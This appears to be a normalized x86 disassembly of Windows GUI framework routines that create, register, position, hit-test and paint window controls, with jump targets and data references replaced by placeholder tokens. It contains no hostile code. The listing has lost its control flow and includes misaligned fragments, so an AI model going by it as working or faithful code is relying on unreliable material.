pop esi
pop ebx
retn
sub_43d878
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_43d858
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_43d81c
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_43d8b8
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_43d878
add esp 0x10
retn
sub_43d8e0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_43d94c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_43a984
test al al
je r-xdata
mov eax ebx
call sub_43a9b4
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403300
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403300
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403300
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_43d9b4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43dad2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402b18
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_43d94c
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_440b28
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403054
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4040b8
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_40859c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dad9
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_43dae0
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_43dca1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_4370ec
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_4370ec
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
call sub_403890
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40cb1c
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40cb1c
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408750
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_440e38
push 0x1
mov eax [ esi + 0x68 ]
call sub_41cc3c
mov ecx eax
mov edx 0x30
mov eax esi
call sub_43b4f4
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_440b28
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dca8
lea eax [ ebp - 0xc0 ]
call sub_403e54
retn
mov eax esi
mov si 0xffee
call sub_403300
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_43dcb0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406868
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_43dcf0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417ce4
mov eax esi
call sub_417c34
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_417c34
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_417cec
pop esi
pop ebx
retn
sub_43dd28
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_419530
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_4194bc
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_4194bc
mov eax esi
call sub_419538
add esp 0x10
pop esi
pop ebx
retn
sub_43dd90
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_43dd7c
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_413d6c
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413d6c
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_43de68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43b82c
mov eax [ ebp - 0x8 ]
push eax
push sub_43dcf0
mov eax [ ebp - 0x8 ]
push eax
push sub_43dd28
push ebp
call sub_43dd90
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43dec3
add [ ebx + 0x56 ] dl
push edi
mov ebx eax
mov eax ebx
call sub_43a2c0
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408704
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408718
mov ecx eax
mov edx edi
mov eax ebx
call sub_43a2d0
mov eax r-xdata
call sub_408724
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_438d74
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_43df1c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_43df69
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43df70
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40cb1c
sub_43df80
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_413dc8
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_413d6c
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_43dfc8
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_43d858
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_43df80
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43d81c
call sub_4399a0
inc edi
dec esi
jne r-xdata
sub_43e064
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_43e080
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_413d6c
call sub_43e080
inc edi
dec esi
jne r-xdata
sub_43e0e0
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403300
mov ebx eax
mov eax edi
call sub_43e080
mov eax edi
call sub_43e21c
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_43e120
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_43e1f6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_43b4f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413d6c
call sub_43e120
inc esi
dec ebx
jne r-xdata
sub_43e21c
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43e120
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_43e25c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_43e080
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_43e21c
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406858
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43b4f4
jmp r-xdata
sub_43e2e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43e33c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_43e32b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e332
call sub_438d74
call sub_420ef8
retn
sub_43e35c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_412910
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406840
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_43b4f4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_43e414
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_413d6c
call sub_43e35c
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_413d6c
call sub_43e35c
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_43e4a8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_440b28
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_40682c
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_43e414
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406840
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_43b4f4
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_43e53c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_43aab0
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_43b5c0
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_43e4a8
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_40682c
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_439e90
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_43e414
test eax eax
je r-xdata
mov eax ebx
call sub_4514e0
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_43b5c0
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_440e2c
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_440b28
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_440b28
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_43b4f4
sub_43e6a0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_43b754
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_43b4f4
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41c768
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_41d3ec
call sub_41c768
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_41d428
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_439eec
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_43e7a8
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_4371d8
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_43b4f4
mov [ esi + 0xc ] eax
mov bl 0x1
sub_43e7dc
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_43e8fc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43e934
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e903
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_413d6c
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_43e934
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_413dc8
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_413d6c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
